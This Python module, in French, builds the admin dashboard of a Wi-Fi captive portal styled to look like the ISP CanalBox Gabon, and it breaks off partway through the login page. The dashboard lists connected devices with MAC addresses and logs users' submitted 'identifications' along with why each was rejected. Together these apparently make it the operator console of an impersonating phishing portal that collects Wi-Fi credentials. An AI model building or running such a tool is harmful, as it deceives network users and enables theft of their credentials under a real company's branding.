"""Pages d'administration du portail, au design de la page CanalBox."""

import hmac
import html
import secrets
import threading
import time

DUREE_SESSION = 8 * 3600
MAX_ESSAIS = 5
BLOCAGE = 90

_sessions = {}
_essais = {}
_verrou = threading.Lock()


def _balayer(maintenant):
    for jeton, fin in list(_sessions.items()):
        if fin <= maintenant:
            _sessions.pop(jeton, None)
    for ip, (_, debut) in list(_essais.items()):
        if maintenant - debut > BLOCAGE:
            _essais.pop(ip, None)


def bloque(ip):
    maintenant = time.time()
    with _verrou:
        _balayer(maintenant)
        nb, debut = _essais.get(ip, (0, maintenant))
        return nb >= MAX_ESSAIS and (maintenant - debut) <= BLOCAGE


def _noter_echec(ip):
    maintenant = time.time()
    with _verrou:
        nb, debut = _essais.get(ip, (0, maintenant))
        if maintenant - debut > BLOCAGE:
            _essais[ip] = (1, maintenant)
        else:
            _essais[ip] = (nb + 1, debut)


def _effacer_echecs(ip):
    with _verrou:
        _essais.pop(ip, None)


def verifier(ip, fournie, attendue):
    """Renvoie (jeton, message). Le jeton est None si l'accès est refusé."""
    if not attendue:
        return None, "Aucune clé configurée : relance le portail en choisissant la page Wifi."
    if bloque(ip):
        return None, "Trop d'essais incorrects. Patiente une minute."
    if hmac.compare_digest(fournie, attendue):
        _effacer_echecs(ip)
        jeton = secrets.token_urlsafe(24)
        with _verrou:
            _sessions[jeton] = time.time() + DUREE_SESSION
        return jeton, None
    _noter_echec(ip)
    return None, "Clé incorrecte."


def session_valide(jeton):
    if not jeton:
        return False
    maintenant = time.time()
    with _verrou:
        fin = _sessions.get(jeton)
        if fin is None:
            return False
        if fin <= maintenant:
            _sessions.pop(jeton, None)
            return False
        return True


def fermer(jeton):
    with _verrou:
        _sessions.pop(jeton, None)


_STYLE = """
:root{
  --cb-green:#00BE80; --cb-green-dark:#00A86B; --cb-yellow:#ECC92D; --cb-black:#000000;
  --cb-white:#FFFFFF; --cb-gray-bg:#F4F6F8; --cb-gray-text:#333333; --cb-muted:#6B7785;
  --cb-line:#E6EBEF; --cb-rouge:#E4002B;
  --radius-pill:50px; --radius-card:16px; --radius-input:12px;
  --ombre:0 4px 24px rgba(15,32,45,0.07);
  --ombre-haute:0 14px 44px rgba(15,32,45,0.16);
}
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
html{scroll-behavior:smooth}
body{
  font-family:'Inter','Segoe UI',system-ui,sans-serif;
  background:var(--cb-gray-bg); color:var(--cb-gray-text);
  font-size:16px; line-height:1.6; min-height:100dvh;
  display:flex; flex-direction:column;
  -webkit-tap-highlight-color:transparent;
  -webkit-font-smoothing:antialiased;
}
h1,h2,h3,h4,.btn,.onglet{font-family:'Poppins','Segoe UI',system-ui,sans-serif;font-weight:600}
.container{max-width:1080px;margin:0 auto;padding:0 20px}

main.container{flex:1 0 auto;width:100%}

/* ===== EN-TÊTE ===== */
header{
  background:var(--cb-black); padding:14px 0;
  position:sticky; top:0; z-index:100;
  border-bottom:2px solid var(--cb-green);
}
header .inner{display:flex;justify-content:space-between;align-items:center;gap:12px}
header .brand{display:flex;align-items:center;gap:10px;color:#fff;min-width:0}
header .brand img{height:26px;flex-shrink:0}
header .brand span{font-size:0.82rem;color:#9aa5ac;font-family:'Inter',sans-serif}
header .help{display:flex;align-items:center;gap:6px;font-size:0.78rem;color:#ccc;flex-shrink:0}
header .help img{width:16px;height:16px}

main.container{flex:1 0 auto;width:100%;padding-top:24px;padding-bottom:48px}

/* ===== BANDEAU ===== */
.alert{
  background:var(--cb-black); color:#fff; padding:22px 24px;
  border-radius:var(--radius-card); margin-bottom:22px;
  display:flex; align-items:flex-start; gap:16px;
  border-left:4px solid var(--cb-green);
  box-shadow:var(--ombre);
}
.alert .icon-badge{
  width:46px;height:46px;background:var(--cb-green);border-radius:50%;
  display:flex;align-items:center;justify-content:center;flex-shrink:0;
}
.alert .icon-badge img{width:24px;height:24px}
.alert h2{font-size:1.08rem;margin-bottom:5px;color:#fff;line-height:1.3}
.alert p{font-size:0.82rem;opacity:0.85;line-height:1.5}
.alert .droite{margin-left:auto;display:flex;gap:8px;align-items:center;flex-shrink:0}

.badge{
  display:inline-block;background:var(--cb-yellow);color:var(--cb-black);
  font-family:'Poppins',sans-serif;font-weight:600;font-size:0.66rem;
  padding:3px 10px;border-radius:var(--radius-pill);
  text-transform:uppercase;letter-spacing:0.5px;margin-bottom:8px;
}
.badge.live{display:inline-flex;align-items:center;gap:6px;background:var(--cb-green);color:#00120c}
.badge.live::before{
  content:"";width:7px;height:7px;border-radius:50%;
  background:#00120c;animation:pouls 1.4s ease-in-out infinite;
}
.badge.live.hors{background:#5c6670;color:#fff}
.badge.live.hors::before{animation:none;background:#fff;opacity:0.5}
@keyframes pouls{0%,100%{opacity:1;transform:scale(1)}50%{opacity:0.35;transform:scale(0.82)}}

/* ===== ONGLETS ===== */
nav.onglets{
  display:flex;gap:4px;margin-bottom:22px;overflow-x:auto;
  background:var(--cb-white);padding:6px;border-radius:var(--radius-pill);
  box-shadow:var(--ombre);scrollbar-width:none;
}
nav.onglets::-webkit-scrollbar{display:none}
.onglet{
  flex:1 0 auto;padding:11px 18px;border:0;border-radius:var(--radius-pill);
  background:transparent;color:var(--cb-muted);font-size:0.82rem;
  letter-spacing:0.02em;cursor:pointer;white-space:nowrap;
  transition:background 0.18s,color 0.18s,transform 0.12s;
  display:inline-flex;align-items:center;justify-content:center;gap:7px;
}
.onglet:hover{background:#F1F5F7;color:var(--cb-gray-text)}
.onglet[aria-selected="true"]{background:var(--cb-black);color:#fff}
.onglet .pastille{
  background:var(--cb-green);color:#00120c;font-size:0.68rem;
  padding:1px 7px;border-radius:100px;font-family:'Inter',sans-serif;font-weight:600;
}
.onglet[aria-selected="true"] .pastille{background:#fff;color:#000}
.panneau{display:none;animation:apparait 0.32s ease}
.panneau.actif{display:block}
@keyframes apparait{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}

/* ===== CARTES ===== */
.card{
  background:var(--cb-white); border-radius:var(--radius-card);
  box-shadow:var(--ombre); margin-bottom:20px; overflow:hidden;
}
.card-pad{padding:24px}
.card-tete{
  display:flex;align-items:center;justify-content:space-between;
  gap:14px;flex-wrap:wrap;margin-bottom:16px;
}
.card h2.titre{
  font-size:0.74rem;letter-spacing:0.16em;text-transform:uppercase;
  color:var(--cb-green);margin:0;
}
.card h2.titre .compte{
  font-family:'Inter',sans-serif;letter-spacing:0;text-transform:none;
  color:var(--cb-muted);font-weight:500;font-size:0.8rem;
}

/* ===== CARTES STAT ===== */
.grille-stats{
  display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));
  gap:12px;margin-bottom:20px;
}
.stat{
  background:var(--cb-white);border-radius:14px;padding:18px 18px 16px;
  box-shadow:var(--ombre);border-top:3px solid var(--cb-green);
  transition:transform 0.2s,box-shadow 0.2s;
}
.stat:hover{transform:translateY(-2px);box-shadow:var(--ombre-haute)}
.stat .valeur{
  font-family:'Poppins',sans-serif;font-weight:600;font-size:1.6rem;
  line-height:1.1;color:var(--cb-black);letter-spacing:-0.02em;
}
.stat .libelle{
  font-size:0.72rem;color:var(--cb-muted);text-transform:uppercase;
  letter-spacing:0.1em;margin-top:6px;
}

dl{display:grid;grid-template-columns:150px 1fr;gap:10px 16px;font-size:0.88rem}
dt{color:var(--cb-muted);font-weight:500}
dd{margin:0;color:var(--cb-gray-text);word-break:break-word;font-weight:500}

/* ===== TABLEAUX ===== */
.tableau-englobe{overflow-x:auto;margin:0 -24px;padding:0 24px}
table{width:100%;border-collapse:collapse;font-size:0.84rem}
thead th{
  text-align:left;padding:10px 12px;border-bottom:2px solid var(--cb-line);
  color:var(--cb-muted);font-family:'Poppins',sans-serif;font-weight:500;
  font-size:0.68rem;letter-spacing:0.1em;text-transform:uppercase;
  white-space:nowrap;position:sticky;top:0;background:var(--cb-white);z-index:2;
}
thead th.triable{cursor:pointer;user-select:none;transition:color 0.15s}
thead th.triable:hover{color:var(--cb-green)}
thead th .fleche{opacity:0.25;margin-left:4px;font-size:0.7rem}
thead th[aria-sort] .fleche{opacity:1;color:var(--cb-green)}
tbody td{text-align:left;padding:12px;border-bottom:1px solid #F2F5F7;vertical-align:middle}
tbody tr{transition:background 0.14s}
tbody tr:hover{background:#FAFCFD}
tbody tr:last-child td{border-bottom:0}
tbody tr.selectionne{background:rgba(0,190,128,0.07)}
td.ip,.mono{font-family:'Courier New',ui-monospace,monospace;color:var(--cb-green-dark);font-weight:500}
td.nom{font-weight:500}
.vide{color:#98A4AE;font-style:italic}

/* pastilles d'état */
.pastille-etat{
  display:inline-flex;align-items:center;gap:5px;
  padding:3px 10px;border-radius:100px;font-size:0.71rem;font-weight:500;
  white-space:nowrap;
}
.pastille-etat.ok{background:rgba(0,190,128,0.13);color:#00805A}
.pastille-etat.ko{background:rgba(228,0,43,0.1);color:#B00022}

/* ===== BARRE D'OUTILS ===== */
.barre-outils{
  display:flex;gap:10px;align-items:center;flex-wrap:wrap;
  margin-bottom:16px;
}
.recherche{
  position:relative;flex:1 1 220px;min-width:0;
}
.recherche input{
  width:100%;padding:11px 14px 11px 40px;border:2px solid var(--cb-line);
  border-radius:var(--radius-pill);font-size:0.86rem;font-family:'Inter',sans-serif;
  background:var(--cb-white);transition:border-color 0.18s,box-shadow 0.18s;
}
.recherche input:focus{
  outline:none;border-color:var(--cb-green);
  box-shadow:0 0 0 3px rgba(0,190,128,0.12);
}
.recherche::before{
  content:"";position:absolute;left:15px;top:50%;transform:translateY(-50%);
  width:14px;height:14px;border:2px solid var(--cb-muted);border-radius:50%;
  opacity:0.6;pointer-events:none;
}
.recherche::after{
  content:"";position:absolute;left:26px;top:calc(50% + 5px);
  width:6px;height:2px;background:var(--cb-muted);transform:rotate(45deg);
  opacity:0.6;pointer-events:none;
}

.btn{
  border:none;border-radius:var(--radius-pill);background:var(--cb-green);
  color:var(--cb-black);font-family:'Poppins','Segoe UI',sans-serif;font-weight:600;
  cursor:pointer;display:inline-flex;align-items:center;justify-content:center;gap:8px;
  text-decoration:none;transition:background 0.18s,transform 0.12s,box-shadow 0.18s;
  white-space:nowrap;
}
.btn img{width:20px;height:20px}
.btn:hover{background:#00d48a;box-shadow:0 6px 18px rgba(0,190,128,0.28)}
.btn:active{transform:scale(0.97)}
.btn:disabled{opacity:0.45;cursor:not-allowed;box-shadow:none;transform:none}
.btn.bloc{width:100%;padding:15px;font-size:1rem;margin-top:18px}
.btn.petit{padding:9px 16px;font-size:0.78rem;letter-spacing:0.02em}
.btn.discret{
  background:transparent;color:var(--cb-muted);border:2px solid var(--cb-line);
}
.btn.discret:hover{background:#F1F5F7;color:var(--cb-gray-text);box-shadow:none}
.btn.danger{background:var(--cb-rouge);color:#fff}
.btn.danger:hover{background:#c80026;box-shadow:0 6px 18px rgba(228,0,43,0.28)}
.btn.danger.discret{background:transparent;color:var(--cb-rouge);border-color:rgba(228,0,43,0.35)}
.btn.danger.discret:hover{background:rgba(228,0,43,0.07);color:var(--cb-rouge)}

/* ===== JOURNAL ===== */
.journal-zone{position:relative}
pre{
  margin:0;padding:18px;border-radius:12px;
  background:#0A1015;color:#7FE6B4;
  font-family:'Courier New',ui-monospace,monospace;
  font-size:0.76rem;line-height:1.65;
  max-height:420px;overflow:auto;
  white-space:pre-wrap;word-break:break-word;
  border:1px solid #1B2A33;
}
pre::-webkit-scrollbar{width:10px;height:10px}
pre::-webkit-scrollbar-thumb{background:#243642;border-radius:10px}
.journal-barre{
  display:flex;gap:8px;align-items:center;justify-content:flex-end;
  margin-bottom:12px;flex-wrap:wrap;
}
.auto-defile{
  display:inline-flex;align-items:center;gap:7px;font-size:0.76rem;
  color:var(--cb-muted);cursor:pointer;user-select:none;
}
.auto-defile input{accent-color:var(--cb-green);width:16px;height:16px}

/* ===== MODALE ===== */
.voile{
  position:fixed;inset:0;background:rgba(6,14,20,0.55);
  backdrop-filter:blur(3px);-webkit-backdrop-filter:blur(3px);
  z-index:900;display:flex;align-items:center;justify-content:center;
  padding:20px;opacity:0;pointer-events:none;transition:opacity 0.22s ease;
}
.voile.ouvert{opacity:1;pointer-events:auto}
.modale{
  background:var(--cb-white);border-radius:18px;width:100%;max-width:440px;
  box-shadow:var(--ombre-haute);padding:28px 26px 24px;
  transform:translateY(16px) scale(0.97);opacity:0;
  transition:transform 0.24s cubic-bezier(0.34,1.3,0.64,1),opacity 0.2s;
  max-height:calc(100dvh - 40px);overflow:auto;
}
.voile.ouvert .modale{transform:translateY(0) scale(1);opacity:1}
.modale .picto{
  width:56px;height:56px;border-radius:50%;margin:0 auto 16px;
  display:flex;align-items:center;justify-content:center;
  background:rgba(0,190,128,0.13);
}
.modale .picto img{width:28px;height:28px}
.modale.danger .picto{background:rgba(228,0,43,0.1)}
.modale h3{
  font-size:1.18rem;text-align:center;margin-bottom:8px;
  color:var(--cb-black);line-height:1.3;
}
.modale p{
  font-size:0.86rem;color:var(--cb-muted);text-align:center;
  line-height:1.55;margin-bottom:22px;
}
.modale .actions{display:flex;gap:10px}
.modale .actions .btn{flex:1;padding:13px;font-size:0.88rem}
.modale .detail{
  background:#F6F8FA;border-radius:10px;padding:12px 14px;
  font-size:0.78rem;color:var(--cb-gray-text);margin-bottom:20px;
  max-height:140px;overflow:auto;
}
.modale .detail div{
  padding:5px 0;display:flex;justify-content:space-between;
  gap:14px;align-items:baseline;
}
.modale .detail span:first-child{
  font-weight:500;color:var(--cb-black);flex:0 1 auto;
  min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;
}
.modale .detail span:last-child{
  font-size:0.74rem;color:var(--cb-muted);flex:0 0 auto;
  font-family:'Courier New',ui-monospace,monospace;
}

/* ===== DIVERS ===== */
.erreur{
  margin-top:14px;padding:12px 16px;border-radius:10px;
  background:rgba(228,0,43,0.08);color:#B00022;font-size:0.82rem;
  border-left:3px solid var(--cb-rouge);
}
.conseil{
  display:flex;align-items:flex-start;gap:10px;margin-top:18px;
  padding-top:16px;border-top:1px solid var(--cb-line);
  font-size:0.76rem;color:var(--cb-muted);line-height:1.55;
}
.conseil img{width:20px;height:20px;flex-shrink:0;opacity:0.75}

.carte-form{max-width:420px;margin:0 auto}
label.champ{
  display:block;font-family:'Poppins',sans-serif;font-weight:500;
  font-size:0.84rem;margin-bottom:8px;
}
input[type=password]{
  width:100%;padding:14px 16px;border:2px solid var(--cb-line);
  border-radius:var(--radius-input);font-size:0.95rem;
  font-family:'Inter',sans-serif;background:var(--cb-white);
  transition:border-color 0.18s,box-shadow 0.18s;
}
input[type=password]:focus{
  outline:none;border-color:var(--cb-green);
  box-shadow:0 0 0 3px rgba(0,190,128,0.12);
}

.pied-actions{
  display:flex;gap:10px;flex-wrap:wrap;margin-top:20px;
}
.pied-actions .btn{flex:1 1 180px;padding:13px;font-size:0.86rem}

footer{
  background:var(--cb-black);color:#fff;margin-top:auto;
  padding:20px 16px;text-align:center;
  flex-shrink:0;
}
footer .marque{display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:6px}
footer .marque img{height:20px;opacity:0.9}
footer .marque span{font-family:'Poppins',sans-serif;font-weight:500;color:#e8e8e8;font-size:0.88rem}
footer .bas{font-size:0.68rem;color:#6b7680;margin-top:6px}

/* ===== RESPONSIVE ===== */
@media(max-width:720px){
  .container{padding:0 14px}
  .alert{padding:16px;border-radius:14px;gap:12px}
  .alert h2{font-size:0.98rem}
  .alert .droite{margin-left:0;width:100%}
  .card-pad{padding:18px 16px}
  .tableau-englobe{margin:0 -16px;padding:0 16px}
  dl{grid-template-columns:112px 1fr;font-size:0.83rem}
  table{font-size:0.78rem}
  thead th,tbody td{padding:9px 8px}
  pre{font-size:0.7rem;padding:14px}
  .stat .valeur{font-size:1.4rem}
  .modale{padding:24px 20px 20px}
}
@media(max-width:480px){
  .onglet{padding:10px 13px;font-size:0.76rem}
  .grille-stats{grid-template-columns:1fr 1fr;gap:10px}
  .barre-outils{gap:8px}
  .recherche{flex:1 1 100%}
}
@media(pointer:coarse){
  .btn{min-height:46px}
  .onglet{min-height:44px}
  thead th.triable{padding:12px 8px}
}
@media(prefers-reduced-motion:reduce){
  *,*::before,*::after{animation-duration:0.01ms !important;animation-iteration-count:1 !important;transition-duration:0.01ms !important}
  html{scroll-behavior:auto}
}
"""

_ENTETE = """<header>
  <div class="container">
    <div class="inner">
      <div class="brand">
        <img src="/canalbox-logo.png" alt="CanalBox">
        <span>Gabon</span>
      </div>
      <div class="help">
        <img src="/icon-info.png" alt="">
        Espace technique
      </div>
    </div>
  </div>
</header>"""

_PIED = """<footer>
  <div class="marque">
    <img src="/canalbox-logo.png" alt="CanalBox">
    <span>CanalBox Gabon</span>
  </div>
  <div class="bas">&copy; 2026 CANALBOX — Portail interne</div>
</footer>"""

_JS = """
(function () {
  'use strict';

  var $ = function (id) { return document.getElementById(id); };

  /* ── Éléments ─────────────────────────────────────────────────────── */
  var corps         = $('corps');
  var journal       = $('journal');
  var essais        = $('essais');
  var compteEssais  = $('compte-essais');
  var compte        = $('compte');
  var pastilleEssais    = $('pastille-essais');
  var pastilleAppareils = $('pastille-appareils');
  var maj           = $('maj');
  var etat          = $('etat');
  var recherche     = $('recherche');
  var toutCocher    = $('tout-cocher');
  var btnSupprimer  = $('btn-supprimer');
  var btnToutEffacer = $('btn-tout-supprimer');
  var autoDefile    = $('auto-defile');

  var stats = {
    appareils: $('st-appareils'), essais: $('st-essais'), valides: $('st-valides')
  };

  /* ── État local ───────────────────────────────────────────────────── */
  var donneesEssais = [];
  var selection = new Set();
  var triColonne = 'id';
  var triSens = -1;          // -1 = décroissant
  var filtre = '';

  var MOTIFS = {
    '': 'soumis',
    'criteres': 'refusé (critères)',
    'correspondance': 'refusé (confirmation)',
    'identite': 'refusé (case non cochée)',
    'vide': 'refusé (champ vide)'
  };

  /* ── Onglets ──────────────────────────────────────────────────────── */
  var onglets = Array.prototype.slice.call(document.querySelectorAll('.onglet'));
  onglets.forEach(function (bouton) {
    bouton.addEventListener('click', function () {
      onglets.forEach(function (autre) {
        autre.setAttribute('aria-selected', autre === bouton ? 'true' : 'false');
        var panneau = $('panneau-' + autre.dataset.panneau);
        if (panneau) { panneau.classList.toggle('actif', autre === bouton); }
      });
    });
  });

  /* ── Modale ───────────────────────────────────────────────────────── */
  var voile = $('voile');
  var modale = $('modale');
  var modaleTitre = $('modale-titre');
  var modaleTexte = $('modale-texte');
  var modaleDetail = $('modale-detail');
  var modalePicto = $('modale-picto');
  var modaleConfirmer = $('modale-confirmer');
  var modaleAnnuler = $('modale-annuler');
  var actionModale = null;
  var dernierFocus = null;

  function ouvrirModale(options) {
    dernierFocus = document.activeElement;
    modaleTitre.textContent = options.titre || '';
    modaleTexte.textContent = options.texte || '';
    modalePicto.innerHTML = '<img src="/icon-warning.png" alt="" style="filter:brightness(0) invert(1)">';
    modale.classList.toggle('danger', options.danger !== false);
    modaleConfirmer.textContent = options.confirmer || 'Confirmer';
    modaleConfirmer.className = 'btn ' + (options.danger !== false ? 'danger' : '');
    modaleDetail.innerHTML = '';
    if (options.details && options.details.length) {
      options.details.forEach(function (ligne) {
        var d = document.createElement('div');
        var a = document.createElement('span');
        var b = document.createElement('span');
        a.textContent = ligne[0];
        b.textContent = ligne[1];
        d.appendChild(a); d.appendChild(b);
        modaleDetail.appendChild(d);
      });
    }
    actionModale = options.action || null;
    voile.classList.add('ouvert');
    setTimeout(function () { modaleConfirmer.focus(); }, 60);
  }

  function fermerModale() {
    voile.classList.remove('ouvert');
    actionModale = null;
    if (dernierFocus && dernierFocus.focus) { dernierFocus.focus(); }
  }

  modaleAnnuler.addEventListener('click', fermerModale);
  voile.addEventListener('click', function (e) { if (e.target === voile) { fermerModale(); } });
  document.addEventListener('keydown', function (e) {
    if (e.key === 'Escape' && voile.classList.contains('ouvert')) { fermerModale(); }
  });
  modaleConfirmer.addEventListener('click', function () {
    var action = actionModale;
    fermerModale();
    if (typeof action === 'function') { action(); }
  });

  /* ── Rendu : appareils ────────────────────────────────────────────── */
  function cellule(texte, classe) {
    var td = document.createElement('td');
    td.textContent = texte;
    if (classe) { td.className = classe; }
    return td;
  }

  function rendre(appareils) {
    corps.innerHTML = '';
    if (!appareils.length) {
      var tr0 = document.createElement('tr');
      var td0 = cellule('Aucun appareil pour le moment.', 'vide');
      td0.colSpan = 5;
      tr0.appendChild(td0);
      corps.appendChild(tr0);
      return;
    }
    appareils.forEach(function (paire) {
      var ip = paire[0];
      var infos = paire[1] || {};
      var tr = document.createElement('tr');
      tr.appendChild(cellule(ip, 'ip'));
      tr.appendChild(cellule(infos.nom || '—', 'nom'));
      tr.appendChild(cellule(infos.systeme || '—'));
      tr.appendChild(cellule(infos.modele || '—'));
      tr.appendChild(cellule(infos.mac || '—', 'mono'));
      corps.appendChild(tr);
    });
  }

  /* ── Rendu : identifications ──────────────────────────────────────── */
  function valeurTri(e, colonne) {
    if (colonne === 'id') { return e.id || 0; }
    if (colonne === 'duree' || colonne === 'longueur') { return Number(e[colonne] || 0); }
    return String(e[colonne] === undefined || e[colonne] === null ? '' : e[colonne]).toLowerCase();
  }

  function essaisAffiches() {
    var liste = donneesEssais.slice();
    if (filtre) {
      var f = filtre.toLowerCase();
      liste = liste.filter(function (e) {
        return [e.utilisateur, e.ip, e.systeme, MOTIFS[e.motif] || '']
          .some(function (v) { return String(v || '').toLowerCase().indexOf(f) !== -1; });
      });
    }
    liste.sort(function (a, b) {
      var va = valeurTri(a, triColonne), vb = valeurTri(b, triColonne);
      if (va < vb) { return -1 * triSens; }
      if (va > vb) { return 1 * triSens; }
      return 0;
    });
    return liste;
  }

  function majBoutons() {
    var n = selection.size;
    btnSupprimer.disabled = n === 0;
    btnSupprimer.innerHTML = '';
    var img = document.createElement('img');
    img.src = '/icon-check.png';
    img.alt = '';
    img.style.cssText = 'filter:none;opacity:' + (n ? '1' : '0.5');
    btnSupprimer.appendChild(img);
    btnSupprimer.appendChild(document.createTextNode(
      n ? ' Supprimer (' + n + ')' : ' Supprimer la sélection'
    ));
    btnToutEffacer.disabled = donneesEssais.length === 0;
    var visibles = essaisAffiches();
    var tousCoches = visibles.length > 0 && visibles.every(function (e) { return selection.has(e.id); });
    toutCocher.checked = tousCoches;
    toutCocher.indeterminate = !tousCoches && visibles.some(function (e) { return selection.has(e.id); });
  }

  function rendreEssais() {
    var liste = essaisAffiches();
    essais.innerHTML = '';
    compteEssais.textContent = donneesEssais.length
      ? '(' + liste.length + (filtre ? ' sur ' + donneesEssais.length : '') + ')'
      : '';
    pastilleEssais.textContent = donneesEssais.length;

    if (!liste.length) {
      var tr0 = document.createElement('tr');
      var td0 = cellule(filtre ? 'Aucun résultat pour ce filtre.' : 'Aucune identification pour le moment.', 'vide');
      td0.colSpan = 7;
      tr0.appendChild(td0);
      essais.appendChild(tr0);
      majBoutons();
      return;
    }

    var fragment = document.createDocumentFragment();
    liste.forEach(function (e) {
      var tr = document.createElement('tr');
      if (selection.has(e.id)) { tr.className = 'selectionne'; }

      var tdCase = document.createElement('td');
      var casee = document.createElement('input');
      casee.type = 'checkbox';
      casee.style.cssText = 'width:17px;height:17px;accent-color:#00BE80;cursor:pointer';
      casee.checked = selection.has(e.id);
      casee.setAttribute('aria-label', 'Sélectionner ' + (e.utilisateur || e.ip));
      casee.addEventListener('change', function () {
        if (casee.checked) { selection.add(e.id); } else { selection.delete(e.id); }
        tr.classList.toggle('selectionne', casee.checked);
        majBoutons();
      });
      tdCase.appendChild(casee);
      tr.appendChild(tdCase);

      tr.appendChild(cellule(e.quand || '—', 'mono'));
      tr.appendChild(cellule(e.utilisateur || '—', 'nom'));
      tr.appendChild(cellule(e.ip || '—', 'ip'));
      tr.appendChild(cellule(e.systeme || 'inconnu'));
      tr.appendChild(cellule((e.duree || 0) + ' s'));

      var tdEtat = document.createElement('td');
      var pastille = document.createElement('span');
      var motif = MOTIFS[e.motif] !== undefined ? MOTIFS[e.motif] : 'soumis';
      pastille.className = 'pastille-etat ' + (e.valide ? 'ok' : 'ko');
      pastille.textContent = motif;
      tdEtat.appendChild(pastille);
      tr.appendChild(tdEtat);

      fragment.appendChild(tr);
    });
    essais.appendChild(fragment);
    majBoutons();
  }

  /* ── Tri ──────────────────────────────────────────────────────────── */
  Array.prototype.slice.call(document.querySelectorAll('th.triable')).forEach(function (th) {
    th.addEventListener('click', function () {
      var colonne = th.dataset.tri;
      if (triColonne === colonne) {
        triSens = -triSens;
      } else {
        triColonne = colonne;
        triSens = colonne === 'id' ? -1 : 1;
      }
      Array.prototype.slice.call(document.querySelectorAll('th.triable')).forEach(function (autre) {
        autre.removeAttribute('aria-sort');
        var fleche = autre.querySelector('.fleche');
        if (fleche) { fleche.textContent = '↕'; }
      });
      th.setAttribute('aria-sort', triSens === 1 ? 'ascending' : 'descending');
      var f = th.querySelector('.fleche');
      if (f) { f.textContent = triSens === 1 ? '↑' : '↓'; }
      rendreEssais();
    });
  });

  /* ── Recherche ────────────────────────────────────────────────────── */
  var minuteur = null;
  recherche.addEventListener('input', function () {
    clearTimeout(minuteur);
    minuteur = setTimeout(function () {
      filtre = recherche.value.trim();
      rendreEssais();
    }, 160);
  });

  /* ── Sélection globale ────────────────────────────────────────────── */
  toutCocher.addEventListener('change', function () {
    var visibles = essaisAffiches();
    if (toutCocher.checked) {
      visibles.forEach(function (e) { selection.add(e.id); });
    } else {
      visibles.forEach(function (e) { selection.delete(e.id); });
    }
    rendreEssais();
  });

  /* ── Suppression ──────────────────────────────────────────────────── */
  var base = '/admin/etat';

  function poster(url, corps) {
    return fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(corps || {})
    }).then(function (r) {
      if (!r.ok) { throw new Error('statut ' + r.status); }
      return r.json();
    });
  }

  btnSupprimer.addEventListener('click', function () {
    var ids = Array.from(selection);
    if (!ids.length) { return; }
    var lignes = donneesEssais.filter(function (e) { return selection.has(e.id); });
    var apercu = lignes.slice(0, 5).map(function (e) {
      return [e.utilisateur || '—', e.quand || ''];
    });
    if (lignes.length > 5) { apercu.push(['… et ' + (lignes.length - 5) + ' autre(s)', '']); }
    ouvrirModale({
      titre: 'Supprimer ' + ids.length + ' identification' + (ids.length > 1 ? 's' : '') + ' ?',
      texte: 'Cette action est définitive. Les lignes choisies seront effacées de la base.',
      details: apercu,
      confirmer: 'Supprimer',
      danger: true,
      action: function () {
        poster(base + '/supprimer', { ids: ids }).then(function () {
          selection.clear();
          rafraichir();
        }).catch(function () { signalerErreur(); });
      }
    });
  });

  btnToutEffacer.addEventListener('click', function () {
    ouvrirModale({
      titre: 'Tout effacer ?',
      texte: 'Les ' + donneesEssais.length + ' identifications enregistrées seront définitivement supprimées. '
           + 'Cette action ne peut pas être annulée.',
      confirmer: 'Tout effacer',
      danger: true,
      action: function () {
        poster(base + '/vider', {}).then(function () {
          selection.clear();
          rafraichir();
        }).catch(function () { signalerErreur(); });
      }
    });
  });

  var erreurAffichee = false;
  function signalerErreur() {
    if (erreurAffichee) { return; }
    erreurAffichee = true;
    ouvrirModale({
      titre: 'Suppression impossible',
      texte: 'Le serveur n\\'a pas confirmé la suppression. Vérifie la connexion puis réessaie.',
      confirmer: 'Fermer',
      danger: true,
      action: null
    });
    setTimeout(function () { erreurAffichee = false; }, 3000);
  }

  /* ── Copier le journal ────────────────────────────────────────────── */
  $('btn-copier').addEventListener('click', function () {
    var bouton = this;
    var texte = journal.textContent || '';
    var fini = function () {
      bouton.textContent = 'Copié';
      setTimeout(function () { bouton.textContent = 'Copier'; }, 1600);
    };
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(texte).then(fini).catch(function () {
        bouton.textContent = 'Impossible';
      });
    } else {
      var zone = document.createElement('textarea');
      zone.value = texte;
      document.body.appendChild(zone);
      zone.select();
      try { document.execCommand('copy'); fini(); } catch (e) {} 
      document.body.removeChild(zone);
    }
  });

  /* ── Rafraîchissement ─────────────────────────────────────────────── */
  var dernierJournal = '';

  function rafraichir() {
    fetch('/admin/etat', { cache: 'no-store' })
      .then(function (r) {
        if (!r.ok) { throw new Error('statut ' + r.status); }
        return r.json();
      })
      .then(function (d) {
        donneesEssais = d.essais || [];
        // On oublie les sélections qui ne correspondent plus à une ligne existante.
        var existants = new Set(donneesEssais.map(function (e) { return e.id; }));
        selection.forEach(function (id) { if (!existants.has(id)) { selection.delete(id); } });

        rendre(d.appareils || []);
        rendreEssais();

        var s = d.stats || {};
        var montrer = function (el, valeur) {
          if (!el) { return; }
          el.textContent = (valeur === undefined || valeur === null) ? '—' : valeur;
        };
        montrer(stats.appareils, s.appareils);
        montrer(stats.essais, s.essais);
        montrer(stats.valides, s.essais_valides);

        compte.textContent = (d.appareils || []).length ? '(' + (d.appareils || []).length + ')' : '';
        pastilleAppareils.textContent = (d.appareils || []).length;

        var texteJournal = (d.journal || []).length ? d.journal.join('\\n') : 'Journal vide.';
        if (texteJournal !== dernierJournal) {
          journal.textContent = texteJournal;
          dernierJournal = texteJournal;
          if (autoDefile.checked) {
            journal.scrollTop = journal.scrollHeight;
          }
        }

        maj.textContent = d.maj || '';
        etat.textContent = 'En direct';
        etat.className = 'badge live';
      })
      .catch(function () {
        etat.textContent = 'Hors ligne';
        etat.className = 'badge live hors';
      });
  }

  rafraichir();
  setInterval(function () {
    // On ne rafraîchit pas pendant une confirmation : ça éviterait de perturber la modale.
    if (!voile.classList.contains('ouvert')) { rafraichir(); }
  }, 2500);
})();
"""


def page_connexion(message=None, erreur=False):
    bloc = f'<p class="erreur">{html.escape(message)}</p>' if message else ""
    return f"""<!DOCTYPE html>
<html lang="fr"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="color-scheme" content="light">
<title>CanalBox — Espace technique</title>
